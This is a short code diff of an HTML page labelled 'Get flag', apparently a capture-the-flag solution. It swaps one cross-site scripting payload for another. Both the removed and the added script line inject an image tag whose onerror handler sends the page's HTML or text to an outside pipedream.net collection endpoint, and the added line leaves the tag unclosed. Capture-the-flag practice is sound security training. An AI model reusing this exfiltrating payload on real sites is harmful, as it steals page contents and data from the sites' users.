@@ -8,7 +8,7 @@
 <body>
     <p>Get flag</p>
     <script>
-        document.querySelector("body").innerHTML += `<img src=none onerror="this.src='https://eo8bzrb9y2mj48v.m.pipedream.net?' + encodeURIComponent(document.documentElement.innerHTML); this.onerror=null;">`;
+      document.querySelector("#ctf").outerHTML= `<img src=x onerror='fetch("https://eo8bzrb9y2mj48v.m.pipedream.net?" + document.querySelector("body").innerText)'`
     </script>
 </body>
 </html>
